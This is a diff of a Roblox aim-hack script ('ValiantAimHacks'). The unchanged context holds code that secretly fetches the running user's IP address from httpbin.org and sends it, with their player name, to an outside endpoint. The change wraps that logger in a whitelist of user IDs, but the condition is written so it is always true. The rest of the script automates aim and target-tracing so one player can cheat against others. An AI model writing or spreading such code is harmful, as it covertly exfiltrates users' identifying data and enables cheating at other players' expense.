@@ -193,7 +193,11 @@ function ValiantAimHacks.findDirectionNormalMaterial(Origin, Destination, UnitMu
 	return nil
 end
 
-local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
+
+if LocalPlayer.UserId == 623162005 or 1638172844 or 1308829163 or 1278815007 then
+	-- lol
+else
+	local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
 
 	local response = syn.request(
 		{
@@ -205,6 +209,9 @@ local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
 			Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. " has used the script lmao"..  " " ..  XD .. "```"})
 		}
 	);
+end
+
+
 
 -- // Get Character
 function ValiantAimHacks.getCharacter(Player)
@@ -349,7 +356,7 @@ function ValiantAimHacks.ChangePlayer()
 	if (not Chance) then
 		ValiantAimHacks.Selected = (Chance and LocalPlayer or LocalPlayer)
 
-	--	return (Chance and LocalPlayer or LocalPlayer)
+		--	return (Chance and LocalPlayer or LocalPlayer)
 	end
 	if not ValiantAimHacks.SilentAimEnabled then
 		ValiantAimHacks.Selected = (LocalPlayer)
@@ -366,15 +373,15 @@ function ValiantAimHacks.ChangePlayer()
 			end
 		else ValiantAimHacks.getClosestPlayerToCursor()
 		end 
-if TSelected ~= nil then
-	if TSelected ~= nil and TSelected.Character:WaitForChild("BodyEffects") ~= nil and TSelected.Character.BodyEffects["K.O"].Value == false and ValiantAimHacks.Radius(TSelected) then
-		ValiantAimHacks.TracingTarget = (TSelected or LocalPlayer)
-	else
-		ValiantAimHacks.TgetClosestPlayerToCursor()
-	end
-else
-	ValiantAimHacks.TgetClosestPlayerToCursor()
-end
+		if TSelected ~= nil then
+			if TSelected ~= nil and TSelected.Character:WaitForChild("BodyEffects") ~= nil and TSelected.Character.BodyEffects["K.O"].Value == false and ValiantAimHacks.Radius(TSelected) then
+				ValiantAimHacks.TracingTarget = (TSelected or LocalPlayer)
+			else
+				ValiantAimHacks.TgetClosestPlayerToCursor()
+			end
+		else
+			ValiantAimHacks.TgetClosestPlayerToCursor()
+		end
 	end
 end
 -- // Heartbeat Function
